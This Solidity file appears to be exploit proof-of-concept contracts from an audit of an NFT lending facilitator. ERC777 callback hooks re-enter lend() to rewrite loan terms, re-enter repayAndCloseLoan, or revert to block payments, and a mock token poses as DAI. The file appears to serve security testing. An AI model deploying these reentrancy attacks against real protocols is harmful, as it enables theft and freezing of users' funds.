// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import "@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";
import "@openzeppelin/contracts/token/ERC777/ERC777.sol";
import "@openzeppelin/contracts/utils/introspection/IERC1820Registry.sol";
import { INFTLoanFacilitator } from "../../interfaces/INFTLoanFacilitator.sol";
import { ERC20 } from "@rari-capital/solmate/src/utils/SafeTransferLib.sol";

contract TokenERC777 is ERC777 {
    address[] _defaultOperators;

    constructor() ERC777("Token 777", "T777", _defaultOperators) {}

    function mint(uint256 amount, address to) external {
        _mint(to, amount, "", "");
    }
}

contract AttackerH2 is IERC777Recipient {
    IERC1820Registry internal constant _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);

    INFTLoanFacilitator facilitator;
    TokenERC777 token;

    uint256 currentLoanId;

    uint16 interestRate = 15;
    uint128 loanAmount = 100e18;
    uint32 loanDuration = 1000;

    uint256 callCount = 0;

    constructor(address _facilitator, address _token) {
        facilitator = INFTLoanFacilitator(_facilitator);
        token = TokenERC777(_token);
        _ERC1820_REGISTRY.setInterfaceImplementer(address(this), keccak256("ERC777TokensRecipient"), address(this));
    }

    function lend(uint256 loanId, uint16 _interestRate, uint128 _loanAmount, uint32 _loanDuration) public {
        currentLoanId = loanId;
        interestRate = _interestRate;
        loanAmount = _loanAmount;
        loanDuration = _loanDuration;

        token.mint(loanAmount, address(this));
        token.approve(address(facilitator), 2 ** 256 - 1); // approve for lending
        facilitator.lend(loanId, interestRate, loanAmount, loanDuration, address(this));
        callCount++;
    }

    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external override {
        if (callCount == 1) {
            callCount++;
            facilitator.lend(currentLoanId, 0, loanAmount, loanDuration * 100, address(this));
        }
    }
}

contract BorrowerH3 is IERC777Recipient {
    IERC1820Registry internal constant _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);

    INFTLoanFacilitator facilitator;
    TokenERC777 token;

    uint256 currentLoanId;
    bool didLend;

    constructor(address _facilitator, address _token) {
        facilitator = INFTLoanFacilitator(_facilitator);
        token = TokenERC777(_token);
        _ERC1820_REGISTRY.setInterfaceImplementer(address(this), keccak256("ERC777TokensRecipient"), address(this));
    }

    function lend(uint256 loanId, uint16 interestRate, uint128 loanAmount, uint32 loanDuration) public {
        currentLoanId = loanId;
        token.mint(loanAmount, address(this));
        token.approve(address(facilitator), 2 ** 256 - 1); // approve for lending
        facilitator.lend(loanId, interestRate, loanAmount, loanDuration, address(this));
        didLend = true;
    }

    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external override {
        if (didLend) {
            delete didLend;
            facilitator.repayAndCloseLoan(currentLoanId);
        }
    }
}

contract AttackerM1 is IERC777Recipient {
    IERC1820Registry internal constant _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);

    INFTLoanFacilitator facilitator;
    TokenERC777 token;

    uint256 currentLoanId;

    bool shouldRevert = false;

    constructor(INFTLoanFacilitator _facilitator, TokenERC777 _token) {
        facilitator = INFTLoanFacilitator(_facilitator);
        token = TokenERC777(_token);
        _ERC1820_REGISTRY.setInterfaceImplementer(address(this), keccak256("ERC777TokensRecipient"), address(this));
    }

    function lend(uint256 loanId, uint16 interestRate, uint128 loanAmount, uint32 loanDuration) public {
        currentLoanId = loanId;
        token.mint(loanAmount, address(this));
        token.approve(address(facilitator), 2 ** 256 - 1); // approve for lending
        facilitator.lend(loanId, interestRate, loanAmount, loanDuration, address(this));
        shouldRevert = true;
    }

    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external override {
        if (shouldRevert) revert("fuck off!!!!!!");
    }
}

contract TokenM5 is ERC20 {
    constructor() ERC20("DAI", "DAI", 18) {}

    function mint(uint256 amount, address to) external {
        _mint(to, amount);
    }
}
